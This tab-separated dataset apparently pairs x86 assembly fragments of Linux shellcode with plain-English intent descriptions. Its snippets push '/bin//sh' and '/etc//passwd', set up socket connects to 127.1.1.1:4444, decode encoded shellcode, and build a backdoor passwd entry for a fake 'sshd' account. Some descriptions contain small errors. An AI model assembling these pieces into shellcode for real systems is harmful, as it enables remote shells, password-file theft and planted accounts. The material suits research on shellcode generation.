SNIPPETS	INTENTS
pop ecx \n loop l1 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n loop l2 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n loop l3 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n mov ebp, ecx	pick up ecx content from the stack and put it in ebp register
pop ecx \n mov edi, ecx	pick up ecx register from the stak and put its content into edi register
pop ecx \n pop ebx	pick up ecx and ebx from stack
pop edi	make edi register point to xor_value
pop edi	pick up edi content from the stack
pop edi	pick up edi content from stack
pop edi	pop the top element of the stack into edi
pop edi	restore the top of the stack into the edi register
pop edx	pop edx from stack
pop edx	pick up edx content from stack
pop edx	save fd
pop edx	restore edx from the value we pushed onto the stack at the start
pop edx	restore the top of the stack into edx register
pop edx	restore the top of the stack into the edx register
pop edx	pop the top of the stack into the edx register
pop edx	pop the value on the stack back into edx
pop edx \n pop esi \n pop edi \n pop edi	pick up edx, esi, edi x2 from the stack
pop esi	extract esi from the stack
pop esi	transfer word at the current stack top to esi
pop esi	pick up esi register content from the stack
pop esi	pick up esi content fro the stack
pop esi	pick up esi content from stack
pop esi	pick up esi from the stack
pop esi	pick up esi register from the stack
pop esi	pick up esi register that contains the string in db
pop esi	piack up esi content from the stack
pop esi	pop the shellcode address from esi register
pop esi	store encoded_shellcode pointer in esi
pop esi	pop stack(1) into esi
pop esi	address of string -> esi
pop esi	pop the value on the top of the stack into esi
pop esi	pop esi content
pop esi	save shellcode into esi
pop esi	save shellcode address into esi register
pop esi	restore esi from the stack
pop esi	restore esi from the value we pushed onto the stack at the start
pop esi	restore the top of the stack into esi register
pop esi	restore the top of the stack into the esi register
pop esi	pop the top of the stack into the esi register
pop esi	pop the value on the stack back into esi
pop esi	get the address of shellcode
pop esi	load address of the encoded shellcode into esi
pop esi	pop the shellcode into esi
pop esi	pop the address of the encoded shellcode into esi
pop esi	shellcode address in esi
pop esi	shellcode on esi
pop esi	store the address of the shellcode in esi
pop esi	store the pointer to the encoded shellcode in esi
pop esi	store the shellcode in esi
pop esi	store the shellcode pointer to esi
pop esi	save the shellcode in the esi register
pop esi	load the shellcode in esi
pop esi	encoded shellcode in esi
pop esi	save the address of the shellcode in esi
pop esi	pop the address of the shellcode in the esi register
pop esi	store the pointer to the shellcode into esi
pop esi \n mov ax, [esi]	store the shellcode in the esi register and copy it into ax
pop esi \n mov bx, [esi]	save the encoded shellcode in esi and move it into bx
pop esi \n mov cx, [esi]	store the shellcode in esi and move it into cx
pop esi \n mov cx, [esi]	point esi to the shellcode and save it into cx
pop esi \n mov dx, [esi]	pop the shellcode in esi and save it into dx
pop esi \n push esi	transfer word at the current stack top to esi and then push esi on the stack
pop esp	restore the top of the stack into the esp register
pop si	restore the top of the stack into the si register
popad	extract the data for the 8 general-purpose 32-bit registers from the stack
popad	move doublewords from the stack into the 32 bit registers
popad	move doublewords from the stack into the general purpose registers
popad	pop doublewords from the stack into the 32 bit registers
popad	pop doublewords from the stack into the general purpose registers
port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
prepare:	define _ prepare label
prepare:	declare the prepare label
priv_setgid:	define _ priv_setgid label
priv_setgid:	declare the priv_setgid label
priv_setuid:	define :_priv_setuid label
priv_setuid:	declare the priv_setuid label
process_shellcode:	define prcess_shellcode label
process_shellcode:	declare the process_shellcode label
psubb mm3, mm2	"subtract 13 from ""shellcode"""
push _ip	push ip address as _ip on stack
push _ip	push _ip onto the stack
push '//pa'	push '//pa' onto the stack
push '//sh'	push '//sh' onto the stack
push '/bin'	push '/bin' onto the stack
push '/etc'	push '/etc' onto the stack
push 'sswd'	push 'sswd' onto the stack
"push ""sswd"" \n push ""//pa"" \n push ""/etc"""	push ‘/etc//passwd’ on stack
push [tmp]	push the 4 bytes at address tmp onto stack
push [var]	push the 4 bytes at address var onto the stack
push [var2]	push the 4 bytes at address var2 onto the stack
push 0bh	push 0bh onto the stack
push 0x0	push the value 0x0 to the stack
push 0x0	push 0x0 onto the stack
push 0x0 \n push ecx \n push ebx	push the value 0x0, ecx and ebx contents on stack
push 0x0 \n push ecx \n push ebx \n mov ecx,esp	load ‘/bin/cat/etc//paswd\0’ into ex register
push 0x0068732f \n push 0x6e69622f \n mov ebx, esp	save /bin/sh in the first free 32bit register
push 0x0101017f \n push word 0x5c11 \n push word 0x02 \n mov ecx, esp	save the address 127.1.1.1, the value on 32bit 4444 and af_inet represented in 32bit on ecx register
push 0x04020a0a	push ip adress 0x04020a0a
push 0x04020a0a	push 0x04020a0a onto the stack
push 0x0a206873	push 0x0a206873 onto the stack
push 0x0a206873 \n push 0x2f6e6962 \n push 0x2f3a706d \n push 0x742f3a31 \n push 0x3131313a \n push 0x31313131 \n push 0x3a30754a \n push 0x4c5a304b \n push 0x45683933 \n push 0x78534a52 \n push 0x50446862 \n push 0x73644d24 \n push 0x67513231 \n push 0x3458652e \n push 0x2431243a \n push 0x64687373 \n mov ebp, esp	load the string sshd:$1$.ex412qg$mdsbhdprjsx39hek0zlju0:1111:1111:/tmp:/bin/sh on ebp register
push 0x0a3a7964	push 0x0a3a7964 onto the stack
push 0x0a3a7964 \n push 0x72706475 \n mov edx, esp	load ‘udprdy:’ into edx register
push 0x0a4c4c41	push the value 0x0a4c4c41 onto the stack
push 0x0a4c4c41	push 0x0a4c4c41 onto the stack
push 0x0b \n pop eax	insert the hexadecimal value 11 on the stack and save it in the first free 32bit register
push 0x1	push hexadecimal value 0x1 on stack
push 0x1	push socket_type = sock_stream, 1, on stack
push 0x1	push socket_type = sock_stream = 1 on stack
push 0x1	push 1 onto the stack for sock_stream
push 0x1	set the sol_socket onto the stack
push 0x1	push the value 0x1 onto the stack
push 0x1	push 0x1 to the stack
push 0x1	push 0x1 onto the stack
push 0x1 \n pop eax	load exit syscall number into eac register
push 0x1 \n pop eax	load exit syscall number into eax register
push 0x1 \n pop ebx	load sys_socket = 1 intp ebx
push 0x1 \n push ecx \n push esi	push 16, ecx and esi on the stack
push 0x10	push the size of v4lhost on stack
push 0x10	push lenght of adress 0x10 on stacik
push 0x10	push addrlen = 0x10 on stack
push 0x10	addr leght 16
push 0x10	define the size of inet_address = 16 (hex)
push 0x10	push on stack the size of sock_ad = 16 (hex)
push 0x10	push 0x10 onto the stack
push 0x10	push 0x10 to the stack
push 0x10	push the 0x10 onto the stack
push 0x10	push the value 0x10 onto the stack
push 0x10 \n push ecx	push the hexadecimal value 10 and ecx content on the stack.
push 0x10 \n push ecx \n push edi \n mov ecx,esp	push the hexadecimal value 10, ecx content and edi content on the stack. then load the stack pointer into ecx register.
push 0x10 \n push ecx \n push edx	push the sizeof(struct sockaddr_in), &serv_addr and the sockfd on stack
push 0x10 \n push ecx \n push esi	push the value 0x10, ecx content and esi content on stack
push 0x10 \n push ecx \n push esi	push hexadecimal value 0x10, ecx and esi contents on stack
push 0x10 \n push ecx \n push esi \n mov ecx, esp	save 16, ecx contents and the saved socket descriptor (in esi) on ecx
push 0x10 \n push ecx \n push esi \n mov ecx, esp	save the hexadecimal value 16, ecx contents and esi contents in ecx
push 0x101017f	push the hexadecimal value 0x101017f of ip adress on stack
push 0x101017f	push ip adreess as hexadecimal value 0x101017f on stack
push 0x14	load hexadecimal value 0x14 on edx register
push 0x14 \n pop edx	load hexadecimal value 0x14 on edx register
push 0x16	set the sockaddr size, 0x16, onto the stack
push 0x16	push the value 0x16 onto the stack
push 0x1a	push the value 0x1a onto the stack
push 0x1a	push the value 0x1a to the stack
push 0x1c	push the size of struct on stack
push 0x1c	push the value 0x1c onto the stack
push 0x1c	push the value 0x1c to the stack
push 0x1c \n push ecx \n push esi	push hexadecimal value 0x1c, ecx and esi contents on stack
push 0x1ff9090 \n pop ecx	load hexadecimal value 0x1ff9090 into ecx then shift right its bits 0x10 times
push 0x1ff9090 \n pop ecx	load hexadecimal value 0x1ff9090 into ecx
push 0x2	push the value 2 on the stack
push 0x2	push af_inet = 2 on stack
push 0x2	push 2 on stack
push 0x2	value 0x2 is pushed onto stack (af_inet=2)
push 0x2	push 2 onto the stack for af_inet
push 0x2	set the so_reuseaddr onto the stack
push 0x2	push 0x2 onto the stack
push 0x2	push 0x2 to the stack
push 0x2	push the 0x2 onto the stack
push 0x2 \n mov ecx, esp \n int 0x80	load 0x2 into ecx register and call kernel
push 0x2 \n pop ecx	load the value 0x2 into ecx register
push 0x2 \n push edx \n push 0x1a \n push 0x29	push the size of no=2, the pointer to no, the argument ipv6_v6only=26 and the argument ipproto=ipv6 = 41 on stack
push 0x203a4457	push the 0x203a4457 onto the stack
push 0x203a4457	push 0x203a4457 onto the stack
push 0x204c4c41	push 0x204c4c41 onto the stack
push 0x204c4c41	push the 0x204c4c41 onto the stack
push 0x2431243a	push 0x2431243a onto the stack
push 0x29	push the value 0x29 to the stack
push 0x29	push 0x29 onto the stack
push 0x2e312e31	push 0x2e312e31 onto the stack
push 0x2e312e31	push the value 0x2e312e31 to the stack
push 0x2e323931	push the value 0x2e323931 onto the stack
push 0x2e323931	push 0x2e323931 to the stack
push 0x2e373231	push 0x2e373231 to the stack
push 0x2e373231	push 0x2e373231 onto the stack
push 0x2e383631	push the value 0x2e383631 onto the stack
push 0x2e383631	push 0x2e383631 to the stack
push 0x2f2f2f2f	push '////' on stack
push 0x2f2f2f2f	push 0x2f2f2f2f onto the stack
push 0x2f2f2f2f	push 0x2f2f2f2f to the stack
push 0x2f2f2f2f	push the 0x2f2f2f2f onto the stack
push 0x2f2f2f2f \n mov eax, esp	push the value 0x2f2f2f2f onto the stack and point eax to the stack register
push 0x2f2f2f2f \n mov ebx, esp	push the value 0x2f2f2f2f onto the stack and point ebx to the stack register
push 0x2f2f2f2f \n mov ecx, esp	push the value 0x2f2f2f2f onto the stack and point ecx to the stack register
push 0x2f2f2f2f \n mov edi, esp	push the value 0x2f2f2f2f onto the stack and point edi to the stack register
push 0x2f2f2f2f \n mov edx, esp	push the value 0x2f2f2f2f onto the stack and point edx to the stack register
push 0x2f2f2f2f \n mov esi, esp	push the value 0x2f2f2f2f onto the stack and point esi to the stack register
push 0x2f2f2f6e	push the 0x2f2f2f6e onto the stack
push 0x2f3a706d	push 0x2f3a706d onto the stack
push 0x2f3a746f	push 0x2f3a746f onto the stack
push 0x2f656c2d	push 0x2f656c2d onto the stack
push 0x2f656c2d	push the 0x2f656c2d onto the stack
push 0x2f6e6962	push '/nib' on stack
push 0x2f6e6962	push 0x2f6e6962 to the stack
push 0x2f6e6962	push 0x2f6e6962 onto the stack
push 0x2faa2faa	push hexadecimal value 0x2faa2faa on stack
push 0x2faa68aa	push hexadecimal value 0x2faa68aa on stack
push 0x3 \n pop ebx	load the command sys_connect = 3 into ebx register
push 0x30	push the value 0x30 onto the stack
push 0x30 \n pop eax	push 48 on the stack and put this value in eax, taking it from the stack
